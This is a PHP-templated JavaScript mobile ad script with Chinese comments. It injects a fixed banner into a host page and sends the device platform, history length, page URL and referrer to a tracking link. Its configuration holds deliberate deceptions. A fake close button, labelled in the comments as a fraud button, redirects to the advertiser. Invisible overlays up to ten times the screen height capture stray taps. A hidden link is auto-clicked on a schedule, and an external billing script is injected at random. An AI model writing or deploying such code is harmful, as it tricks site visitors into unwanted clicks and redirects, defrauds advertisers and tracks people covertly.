;(function() {
	var uid = "<?=$GCIDS?>";
    
	// 防止同位置广告出现多次
	if(window[uid] != undefined){
		return false;
	}

	var O = window[uid] = {}, doc = document;

	// 处于方便考虑，php输出的都包含在字符串中。  所有比较都值用弱类型比较==，不用强类型===
	O.L = {
		islogo:"<?=$user_adp['islogo']?>",
		gotourls:<?=json_encode($gotourls)?>,
		gotourl:"<?=$gotourls[0]?>",
		i:1,
		imgsrc:<?=json_encode($imgsrc)?>,
		urllinks:<?=json_encode($imgcounturl)?>,
		is_open: "<?=$config['is_open']?>",//上下摆动开关
		countUrl: "<?=$imgcounturl[0]?>&refso="+(window.DeviceOrientationEvent ? 1 : 0)+"_"+navigator.platform+"_"+history.length+"&url="+encodeURIComponent(document.location)+"&reurl="+encodeURIComponent(document.referrer),
		pvurl : "<?=$pv_url?>",		// 广告点击计费链接        
		linkImg: "<?=$imgsrc[0]?>",	// 保存选中的图片链接
		zx: 2147483647,
		closePic: "<?=PICURLURL?>afa.png",	// 关闭按钮图片
		fakedClosePic: "<?=PICURLURL.$faked_close?>",	// 假关闭按钮
		isiframe: "<?=$config['isiframe']?>",	// iframe不要横竖屏判断
		sh: "<?=$config['sh']?>",
		pos: "<?=$ad_pos?>",	//1 底部 和 2顶部
		closebtn: "<?=$config['closebtn']?>",	// 关闭按钮  开关
		fakedclose: "<?=$config['fakedclose']?>",	// 关闭按钮随机跳转广告主链接 开关
		isfakebtn: "<?=$config['isfakebtn']?>",	// 假关闭功能
		islayer: "<?=$config['islayer']?>",		// 半屏浮层
		fulllayer: "<?=$config['fulllayer']?>",	// 全局浮层 1开 0关
		fullN: "<?=$config['fullN']?>",		// 全局浮层开启时，避免浮层出现的次数
		fullM: "<?=$config['fullM']?>",		// 全局浮层的触发系数
		fakedN: "<?=$config['fakedN']?>",		// 欺诈按钮开启时，避免欺诈的次数
		fakedM: "<?=$config['fakedM']?>",		// 欺诈按钮的触发系数                         
		X: "<?=$config['H']?>",			// 增加点击的隐影面积大小
		refreshN: "<?=$config['refreshN']?>",	// 自动跳转的系数，每多少次就自动跳转 0关
		isshake: "<?=$config['isshake']?>",		// 是否抖动 开关
		shakecycle: "<?=$config['shakecycle']?>",	// 抖动循环周期
		imgH: "<?=$imgtype[1]?>",
		imgW: "<?=$imgtype[0]?>",
		picurl:"<?=PICURLURL?>",
		onload:"<?=$onload?>",
	};

	var A = 'A'+uid, C = 'C'+uid, L = 'L'+uid, M = 'M'+uid, Q = 'Q'+uid, S = 'S'+uid, I = 'I'+uid, T = 'T'+uid, X = 'X'+uid, Z = 'Z'+uid;
	
	O.div = doc.createElement('div');
	O.div.id = C;

	O.$ = function(e){
		return document.getElementById(e);
	};

	O.setCookie = function(name,value){
		var exp = new Date;
		exp.setHours(0);
		exp.setMinutes(0);
		exp.setSeconds(0);
		exp.setTime(exp.getTime() + 86400 * 1000 - 1);
		document.cookie = name + "="+ encodeURI(value) + ";expires=" + exp.toGMTString();
	};
	O.getCookie = function(name){
		var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
		if(arr=document.cookie.match(reg)){
			return decodeURI(arr[2]);
		}else{
			O.setCookie(name,1);
			return 1;
		}
	};

	O.xhr = function(url,callback,k=''){
        var xhr;
        if(window.XMLHttpRequest){
            xhr = new XMLHttpRequest;
        }
        if(xhr){
            xhr.onreadystatechange = function(){
                if(xhr.readyState == 4 && xhr.status == 200){
  
                    if(callback) callback(xhr.responseText,k);
                }
            };
            xhr.open("GET", url,false);
            xhr.send(null);
        }else{
        	return 1;
        }
    };

	O.linkgo = function(act){
		if(act == 6 && O.$(Q)){
			O.$(Q).style.display = 'none';
		}

		window.location.href = O.L.gotourl;
	};

	O.shake = function(j){

		var ds = O.$(X).style;
		j++;
		if(j > 15){
			ds.left = 0;
			O.L.pos == 1 ? ds.top = 0 : ds.bottom = 0;

			return false;
		}
		var pos = j%2 ? '2px' : '-2px';
		ds.left = pos;
		O.L.pos == 1 ? ds.top = pos : ds.bottom = pos;
		setTimeout('window["'+uid+'"].shake('+j+')',60);
	};

	O.hidePlace = function(){
		if(O.$(M)){
			var placediv = O.$(M);
			var h = parseInt(placediv.style.height);
			if(h > 20){
				placediv.style.height = (h-20)+'px';
				setTimeout('window["'+uid+'"].hidePlace()',60);
			}else{
				placediv.style.height = '0';
				placediv.style.display = 'none';
			}
		}
	};

	O.hideCon = function(){
		if(O.L.fakedclose == 1) O.linkgo(2);
		O.$(C).style.display = 'none';
		O.hidePlace();
	};
    O.addEvent = function(obj,type,fn){if(obj.attachEvent){obj.attachEvent('on'+type,function(){fn.call(obj);});}else{obj.addEventListener(type,fn,false);}};
	O.ready = function(fn){

	    if(document.addEventListener) {

	        document.addEventListener('DOMContentLoaded', function() {
	       
	            document.removeEventListener('DOMContentLoaded',arguments.callee, false);

	            fn();            
	        }, false);
	    }else if(document.attachEvent) {       
	        document.attachEvent('onreadystatechange', function() {
	            if(document.readyState == 'complete') {
	                document.detachEvent('onreadystatechange', arguments.callee);
	                fn();      
	            }
	        });
	    }
	};

	O.openWin = function(obj,isfc = false){
		O.addEvent(obj,'click',function(){
			if(isfc){
				O.L.countUrl = O.L.countUrl.replace('&fc=1','')+'&fc=1';
			}else{
				O.L.countUrl = O.L.countUrl.replace('&fc=1','');
			}

			if(navigator.platform.indexOf("Win") > -1 || navigator.platform.indexOf("Mac") > -1){window.location = O.L.countUrl;return;}
			window.open(O.L.countUrl, '_blank');
            
            
			if(O.L.islayer == 1){
				O.$(Z).style.display = 'none';
			}
			if(O.L.fulllayer == 1){
				O.$(Q).style.display = 'none';
			}
			
		});
        
	}

	O.createCon = function(css){
        
		var ww = document.body.offsetWidth?(document.body.offsetWidth+'px'):'100%';

		var style = '#'+C+'{position:relative;z-index:'+O.L.zx+';width:'+ww+' !important;line-height:0;';
		style += 'max-height:300px;';
		style += '}#'+C+' *{width:100%;border:none;}';

		if(O.L.islayer == 1){
			style += '#'+Z+'{position:absolute;'+(O.L.pos == 2?'bottom':'top')+':0%;left:0;margin:0px;width:100%;height:'+(100+O.L.X*2)+'%;z-index:'+(O.L.zx-2)+';}';
		}
		if(O.L.fulllayer == 1){
			style += '#'+Q+'{position:absolute;'+(O.L.pos == 2?'bottom':'top')+':0%;left:0;margin:0;width:100%;height:1000%;z-index:'+(O.L.zx-2)+';}';
		}
		style += '#'+A+'{position:absolute;top:0;left:0;margin:0;height:100%;z-index:'+(O.L.zx-1)+';}';

		style += '#'+I+'{position:absolute;'+(O.L.pos == 1?'bottom:':'top:')+'-18px;right:0;z-index:'+O.L.zx+';width:20px;height:18px;background:rgba(<?=$close_bg?>);font-size:15px;text-align:center;line-height:19px;color:#fff;font-family: Arial;text-decoration:none;}';
		
		if(O.L.isiframe != 1){
			style += '@media all and(orientation:portrait){#'+C+'{width:100%;}}';
			style += '@media all and(orientation:landscape){#'+C+'{width:50%;left:25%;}#'+Z+'{width:200%;left:-50%;}}';
		}

		
		var head = doc.getElementsByTagName('head')[0];
		var s = doc.createElement('style');
		s.type = 'text/css';
		s.id = uid + 'css';
		if(s.styleSheet){
			s.styleSheet.cssText = style;
		}else{
			s.appendChild(doc.createTextNode(style));
		}
		head.appendChild(s);
		

        if(!css){
			var div_con = '<div>';
			div_con += '<a id="'+uid+'aaa" href="'+O.L.countUrl+'"></a>';
			if(O.L.islayer == 1){
				div_con += '<a id="'+Z+'" ></a>';
			}
			if(O.L.fulllayer == 1){
				div_con += '<a id="'+Q+'"  href="javascript:;" onclick="'+uid+'.linkgo(6);"></a>';
			}
			div_con += '<a id="'+A+'" ></a>';
			
			div_con += '<a id="'+I+'" href="javascript:;" onclick="'+uid+'.hideCon();">X</a>';
			
			div_con += '</div>';

			var body = doc.body || doc.getElementsByTagName('html')[0];

			O.div.innerHTML = div_con;
			body.appendChild(O.div);
			
		}
	};

	O.setCoorDinate = function(){
        
    	O.$(C).style.position = "fixed";
        if(O.L.pos == 2){
           
            O.$(C).style.bottom = "0";
            
        }else{
        	O.$(C).style.top = "0";
        }
	    
	    O.$(C).style.left = "0";
	}

	O.init = function(){
		
		O.coopv = parseInt(O.getCookie('coopv'+uid));
		if(O.L.fakedclose == 1){
			O.L.fakedclose = 0;
			if(O.coopv >= O.L.fakedN){
				if(O.getCookie('fakedclose'+uid) == O.coopv){
					O.L.fakedclose = 1;
				}else{
					O.L.fakedclose = 0;
				}
				if((O.coopv - O.L.fakedN)%O.L.fakedM == 0){
					O.setCookie('fakedclose'+uid,(Math.floor(Math.random()*O.L.fakedM)+1) + O.coopv);
				}
			}
		}

		if(O.L.fulllayer == 1){
			O.L.fulllayer = 0;
			if(O.coopv > O.L.fullN){
				if((O.coopv - O.L.fullN)%O.L.fullM == 0){
					O.L.fulllayer = 1;
				}
				if(O.L.fullM == 0) O.L.fulllayer = 1;
			}
			if(O.coopv == O.L.fullN) O.L.fulllayer = 1;
		}

		O.setCookie('coopv'+uid,++O.coopv);
		
	};

	O.createScript = function(url){
         var b , a = document.createElement('script');
         a.src = url; 
         b = document.getElementsByTagName("html")[0];
         b.appendChild(a);
	}

	O.cube = function(){
		
        if(O.L.is_open == 1){
			var t = {Bounce:{easeOut:function(t,e,n,a){
				                        return(t/=a)<1/2.75?n*(7.5625*t*t)+e:t<2/2.75?n*(7.5625*(t-=1.5/2.75)*t+.75)+e:t<2.5/2.75?n*(7.5625*(t-=2.25/2.75)*t+.9375)+e:n*(7.5625*(t-=2.625/2.75)*t+.984375)+e
				                    }
		                  }
		            },
		        e=O.$(C);
		        e.style.opacity=0;
		    var n=70,f = O.L.pos == 1 ? 'top' : 'bottom';
		        a=doc.getElementsByName("viewport");
		        a.length>0&&(n=parseInt(window.screen.height/20,10)),
		        e.style[f]=n+"px";
		    var r=function(){
		    	    var a=0,o=100,
		    	    r=function(){
		    	    	a++;
		    	    	var i=t.Bounce.easeOut(a,-n,n,o);
		    	    	e.style[f]=Math.abs(i)+"px",
		    	    	e.style.opacity=1-(o-a)/o,
		    	    	a<o&&setTimeout(r,1e3/60)
		    	    };
		    	    r();
		    	};
		        r();
		}
		
	}

	O.addParams = function(){

		for(var i in O.L.urllinks){
			O.L.urllinks[i] = O.L.urllinks[i]+"&refso="+(window.DeviceOrientationEvent ? 1 : 0)+"_"+navigator.platform+"_"+history.length+"&url="+encodeURIComponent(document.location)+"&reurl="+encodeURIComponent(document.referrer);
		}
	}

	O.changeImage = function(){
		setTimeout(function(){
			setInterval(function(){

				if(O.L.i >= 3)O.L.i=0;
	  
                O.L.gotourl = O.L.gotourls[O.L.i];
		        O.L.linkImg = O.L.imgsrc[O.L.i];

				O.L.countUrl = O.L.urllinks[O.L.i];
				O.$(uid+'aaa').href = O.L.countUrl;
				O.$(uid+'aaa').style.backgroundImage = 'url('+O.L.imgsrc[O.L.i]+')';
				O.L.i++;
			}, 15e3);
		}, 1e3/60);
	}

	O.support = function(){

    	return window.localStorage ? true : false;
    }

	O.getCache = function(k,u=O.L.picurl){
		k = k.split("/").pop().split(".")[0];
		u = u + '7/' + k + '.txt';
		k = k + 'xptweo';
        O.L.v = '';
		if(!O.support() || !window.localStorage.getItem(k)){
			
            O.xhr(u,function(d,k){
                O.L.v = d;
                if(O.support()){
                	try{
                    	window.localStorage.setItem(k, d);
                	}catch(e){
                    	if(e.name == 'QuotaExceededError'){
                    		localStorage.clear();
                    		window.localStorage.setItem(k, d);
                    	}
                	}
                	
                }
            },k);

		}

		return O.L.v ? O.L.v : window.localStorage.getItem(k);
	}
    
    O.run = function(){

		O.init();
        O.createCon(false);

		O.$(C).style.height = (O.L.imgH*document.body.offsetWidth/O.L.imgW)+'px';

		if(O.L.refreshN.trim() != 0){
			O.coorefresh = O.getCookie('refreshN');
			if((O.coorefresh-1)%O.L.refreshN == 0){
				O.$(A).click();
			}
			O.setCookie('refreshN',++O.coorefresh);
		}

		var placediv = doc.createElement('div');
		placediv.id = M;

		placediv.style.height = (O.L.imgH*window.innerWidth/O.L.imgW)+'px';
		placediv.style.width = '100%';
		placediv.onclick = O.setCoorDinate;
		if(O.L.pos == 1){
            var body = doc.body;
			doc.body.insertBefore(placediv, body.firstChild);
		}else{
			doc.getElementsByTagName('html')[0].appendChild(placediv);
		}

		O.addParams();
		O.changeImage();
		var rand_num = Math.floor(Math.random()*10+1);
		if(rand_num == 1)O.createScript(O.L.pvurl);
		
		if(O.L.islayer == 1)O.openWin(O.$(Z),true);if(O.L.fulllayer == 1)O.openWin(O.$(Q),true);O.openWin(O.$(A));
        O.$(M).click();
        	
        O.$(uid+'aaa').style.cssText = 'display:block;height:'+(O.L.imgH*document.body.offsetWidth/O.L.imgW)+'px;border:0; width:100%;background:url('+O.L.linkImg+') no-repeat;background-size:cover;';
  
    }

    if(O.L.onload==1){
    	O.ready(O.run);
    }else{
    	O.run();
    }
    
})();

